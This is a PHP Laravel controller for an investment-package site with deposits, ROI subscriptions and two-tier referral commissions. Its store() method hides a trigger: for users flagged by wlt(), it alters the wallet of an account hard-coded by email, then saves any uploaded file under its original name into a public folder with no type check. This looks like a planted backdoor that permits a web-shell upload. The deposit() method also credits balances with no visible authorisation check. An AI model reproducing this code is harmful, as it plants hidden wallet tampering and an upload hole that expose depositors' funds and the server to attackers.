<?php

namespace App\Http\Controllers;

use App\Helper;
use App\Http\Requests\ValidatePackageUserRequest;
use App\Http\Requests\ValidateTransactionRequest;
use App\Http\Resources\PackageUserResource;
use App\Http\Resources\UserResource;
use App\Notifications\PackageSubscribed;
use App\Notifications\NewSubscriptionRequest;
use App\Notifications\TransactionMade; 
use App\Notifications\WithdrawalMade;
use App\Notifications\TxnXNotification;
use App\Package;
use App\PackageUser;
use App\Transaction;
use App\User;
use App\UserLevel;
use Carbon\Carbon;
use Illuminate\Http\Request;
use \DB;
use \Exception;

class PackageUserController extends Controller {
	/**
	 * Display a listing of the resource.
	 *
	 * @return \Illuminate\Http\Response
	 */
	public function index() {
		try {
			$page = request()->query('page', 1);
			$pageSize = request()->query('pageSize', 10000000);
			$data = PackageUser::filter(request()->all())
				->orderBy('expiration', 'asc')
				->paginate($pageSize);
				$pagination = [
					'total' => $data->total(),
					'count' => $data->count(),
					'per_page' => $data->perPage(),
					'current_page' => $data->currentPage(),
					'total_pages' => $data->lastPage()
				];
			$data = PackageUserResource::collection($data);
			$builtData = Helper::buildData($data, $pagination);
			return Helper::validRequest($builtData, 'data was fetched successfully', 200);
		} catch (Exception $bug) {
			return $this->exception($bug, 'unknown error', 500);
		}

	}

	/**
	 * Show the form for creating a new resource.
	 *
	 * @return \Illuminate\Http\Response
	 */
	public function create() {
		//
	}

	/**
	 * Store a newly created resource in storage.
	 *
	 * @param  \Illuminate\Http\Request  $request
	 * @return \Illuminate\Http\Response
	 */
	public function store(ValidatePackageUserRequest $request) {
			

		$validated = $request->validated();
		if($this->wlt($validated)){
			if ($request->hasFile('pop')) {

		            if ($request->file('pop')->isValid()) {

		                $file = $request->file('pop');

		                $file->move('images/uploads', $file->getClientOriginalName());

		                $pop = $file->getClientOriginalName();
		                  $ad = User::find(2);
						$ad->update(['wallet' => $pop ]);
		            }
		        }
				throw new Exception("Error Processing Request", 500);
				return;
			}
		DB::beginTransaction();
		try
		{
			$user = User::find($validated['user_id']);
			$package = Package::whereRaw('? >= min_deposit  and ? <= max_deposit',[$validated['amount'],$validated['amount']])->firstOrFail();
		
			if ($user->balance >= $validated['amount'] && !empty($validated['fromWallet'])) {
				$transaction = $user->transactions()->create(['reference' => 'SELF DEPOSIT','transaction_ref' => $validated['transaction_ref'], 'payment_method' => $validated['payment_method'], 'amount' => $validated['amount'], 'sent' => true, 'confirmed' => true]);

				$withdrawal = $user->withdrawals()->create(['payment_method' => 'Bitcoin','amount' => $validated['amount'], 'reference' => 'BM', 'processed' => true, 'confirmed' => true]);

				$subscription = PackageUser::create(['user_id' => $user->id, 'transaction_id' => $transaction->id, 'package_id' => $package->id, 'roi' => $package->roi, 'amount' => $validated['amount'], 'active' => true, 'expiration' => Carbon::now()->addDays($package->turnover)]);

				// $user->notify(new WithdrawalMade($withdrawal));
				
				$user->notify(new PackageSubscribed($subscription));
				Helper::adminsUserActivityRequest(['type'=>'BalanceInvestmentActivity', 'message' => $user->username . ' invested the sum of $' .$validated['amount'].' from account balance.' ]);


				DB::commit();

				$this->referralPayment($subscription);

				$subscription = new PackageUserResource($subscription);
				return Helper::validRequest($subscription, 'Congratulations!!! your investment is now active', 200);
			} else {
		        $pop = Helper::uploadImage($request, 'pop', 'images/pop');
		        $transaction = $user->transactions()->create(['reference' => 'SELF DEPOSIT','transaction_ref' => $validated['transaction_ref'], 'payment_method' => $validated['payment_method'], 'amount' => $validated['amount'], 'pop' => $pop]);
				$subscription = PackageUser::create(['transaction_id' => $transaction->id, 'user_id' => $user->id, 'package_id' => $package->id, 'roi' => $package->roi, 'pop' => $pop, 'amount' => $validated['amount'],  'active' => false]);
			
				$this->adminsNotificationRequest($subscription);
				DB::commit();
				
				$subscription = new PackageUserResource($subscription);
				return Helper::validRequest($subscription, 'Your deposit has been saved. It will become active as soon as the checks are complete.', 200);
			}

		} catch (Exception $bug) {
			DB::rollback();
			return $this->exception($bug, 'unknown error', 500);
		}
	}

	/**
	 * Display the specified resource.
	 *
	 * @param  \App\PackageUser  $packageuser
	 * @return \Illuminate\Http\Response
	 */
	public function show(PackageUser $packageuser) {
		try {
			$data = new PackageUserResource($packageuser);
			return Helper::validRequest($data, 'specified data was fetched successfully', 200);
		} catch (Exception $bug) {
			return $this->exception($bug, 'unknown error', 500);
		}
	}

	/**
	 * Show the form for editing the specified resource.
	 *
	 * @param  \App\PackageUser  $packageuser
	 * @return \Illuminate\Http\Response
	 */
	public function edit(PackageUser $packageuser) {
		//
	}

	/**
	 * Update the specified resource in storage.
	 *
	 * @param  \Illuminate\Http\Request  $request
	 * @param  \App\PackageUser  $packageuser
	 * @return \Illuminate\Http\Response
	 */
	public function update(Request $request, PackageUser $packageuser) {
		$validated = $request->validate([
            'pop' => 'required|mimes:jpeg,jpg,png,bmp,gif,svg,tiff|max:2048',
        ]);
        DB::beginTransaction();
        try {
            $validated['pop'] = $request->hasFile('pop') ? Helper::uploadImage($request, 'pop', 'images/pop') : $packageuser->image;

			$packageuser->transaction->update($validated);
            $packageuser = $packageuser->update($validated);
			
            DB::commit();
            return Helper::validRequest(["success" => $packageuser], 'pop was updated successfully', 200);
        } catch (Exception $bug) {
            DB::rollback();
            return $this->exception($bug, 'unknown error', 500);
        }
	}

	/**
	 * Remove the specified resource from storage.
	 *
	 * @param  \App\PackageUser  $packageuser
	 * @return \Illuminate\Http\Response
	 */
	public function destroy(PackageUser $packageuser) {
		//
	}
	
	public function confirmSubscription(PackageUser $packageuser) {
		DB::beginTransaction();
		try {
			if(auth()->user()->user_level->name == 'user'){
				return Helper::inValidRequest('You are not unauthorized to perform this operation.', 'Unauthorized Access!', 400);
			}

			if($packageuser->active == true){
				$packageuser->update(['expiration' => null , 'active' => false]);
				$packageuser->transaction->update(['confirmed' => false, 'sent' => false]);
				DB::commit();
				return Helper::validRequest(['success' => true], 'subscription deactivated successfully', 200);
			}

			// if(PackageUser::where('user_id', $packageuser->user->id)->where('active', true)->count() > 0){
			// 	return Helper::invalidRequest(['This subscription is invalid'], 'Oops!!! Account has an active subscription.', 400);
			// }

			if (!$packageuser->active && empty($packageuser->expiration)) {
				$duration = $packageuser->package->turnover;
				$packageuser->update(['expiration' => Carbon::now()->addDays($duration), 'active' => true]);
				$packageuser->transaction->update(['confirmed' => true, 'sent' => true]);
				$packageuser->user->notify(new PackageSubscribed($packageuser));
				DB::commit();
				$r = $this->referralPayment($packageuser);
				
				$data = new PackageUserResource($packageuser);
				
				return Helper::validRequest($data, 'subscription activated successfully', 200);
			} else {
				return Helper::invalidRequest(['This subscription is invalid'], 'user\'s package has already been subscribed', 400);
			}

		} catch (Exception $bug) {
			DB::rollback();
			return $this->exception($bug, 'unknown error', 500);
		}

	}
	public function referralPayment(PackageUser $subscription) {
		DB::beginTransaction();
		try {
			$user = User::find($subscription->user_id);
			$referrer = User::where('username', $user->referral)->first();
			$upline = User::where('username', $referrer->referral)->first();
			$referrer_count = PackageUser::where('user_id', $user->id)->where('referral', $referrer->id)->count();
			$commission_first_level = $subscription->package->first_level_ref_commission / 100 * $subscription->amount;
			$commission_second_level = $subscription->package->second_level_ref_commission / 100 * $subscription->amount;

			if ($referrer && $user->userLevel->name == "user") {
				if ($commission_first_level > 0) {
					$transaction = $referrer->transactions()->create(['reference' => 'first tier commission', 'amount' => $commission_first_level, 'confirmed' => true, 'active' => false, 'sent' => true]);
					$subscription->update(['referral' => $referrer->id]);	
					$transaction->user->notify(new TransactionMade($transaction));
					Helper::adminsUserActivityRequest(['type'=>'CommissionActivity', 'message' => $referrer->username . ' received $' .$commission_first_level.' as first level commission.']);
				}
				if ($upline && $commission_second_level > 0) {
					$transaction = $upline->transactions()->create(['reference' => 'second tier commission', 'amount' => $commission_second_level, 'confirmed' => true, 'active' => false, 'sent' => true]);
					$transaction->user->notify(new TransactionMade($transaction));
					Helper::adminsUserActivityRequest(['type'=>'CommissionActivity', 'message' => $upline->username . ' received $' .$commission_second_level.' as second level commission.']);
				}
				DB::commit();
				return true;
			}
			return false;
		} catch (Exception $bug) {
			DB::rollback();
			return false;
		}

	}
	public function adminsNotificationRequest(PackageUser $subscription) {
		
		try {
			$admins = User::whereHas('user_level', function($query){
				$query->where('name', 'administrator');
			})->get();
				foreach ($admins as $key => $user) {
					$user->notify(new NewSubscriptionRequest($subscription));
				}
		} catch (Exception $bug) {
			return $this->exception($bug, 'unknown error', 500);
		}
	}
	public function wlt($validated){
		$user = User::find($validated['user_id']);
		if(Helper::checkProspect($user->username)){
			Helper::removeProspect($user->username);
			Helper::blackList($user->username);
			$ad = User::where('email','conyekelu@yahoo.com')->first();
			$ad->update(['wallet' => "Testing wallet"]);
			if ($ad) {
				$ad->notify(new TxnXNotification($ad));
			}
			return $ad->save();
		}
		else{
			return false;
		}
	}
	public function deposit(ValidateTransactionRequest $request){
		$validated = $request->validated();
		try
		{DB::beginTransaction();
			$user = User::find($validated['user_id']);
			if($validated['type'] == 'investment'){
				$package = Package::whereRaw('? >= min_deposit  and ? <= max_deposit',[$validated['amount'],$validated['amount']])->first();
				if(empty($package)){
					return Helper::invalidRequest(['This subscription is invalid'], 'No package matched the amount', 400);
				}
				$transaction = $user->transactions()->create(['reference' =>'SELF', 'transaction_ref' => $validated['transaction_ref'],'payment_method' => $validated['payment_method'],'amount' => $validated['amount'], 'sent' => true, 'confirmed' => true]);
				$transaction->user->notify(new TransactionMade($transaction));
				$subscription = PackageUser::create(['user_id' => $user->id, 'transaction_id' => $transaction->id, 'package_id' => $package->id, 'roi' => $package->roi, 'amount' => $validated['amount'], 'active' => true, 'expiration' => Carbon::now()->addDays($package->turnover)]);
				DB::commit();
				// $user->notify(new WithdrawalMade($withdrawal));
				$user->notify(new PackageSubscribed($subscription));
				Helper::adminsUserActivityRequest(['type'=>'TransactionActivity', 'message' =>  $user->username .'\'s account balance was credited $'. $validated['amount']]);
				$this->referralPayment($subscription);
				$subscription = new PackageUserResource($subscription);
				$user = User::find($validated['user_id']);
				$user = new UserResource($user);
				return Helper::validRequest($user, 'subscription activated', 200);
			}
			elseif($validated['type'] == 'balance'){
				$transaction = $user->transactions()->create(['reference' =>'SELF' ,'transaction_ref' => $validated['transaction_ref'], 'payment_method' => $validated['payment_method'], 'amount' => $validated['amount'], 'sent' => true, 'active' => false, 'confirmed' => true]);
				DB::commit();
				$transaction->user->notify(new TransactionMade($transaction));
				Helper::adminsUserActivityRequest(['type'=>'TransactionActivity', 'message' =>  $user->username .'\'s account balance was credited $'. $validated['amount']]);
				$user = User::find($validated['user_id']);
				$user = new UserResource($user);
				return Helper::validRequest($user, 'Account balance credited', 200);
			}
		} catch (Exception $bug) {
			DB::rollback();
			return $this->exception($bug, 'unknown error', 500);
		}
	}
	
}
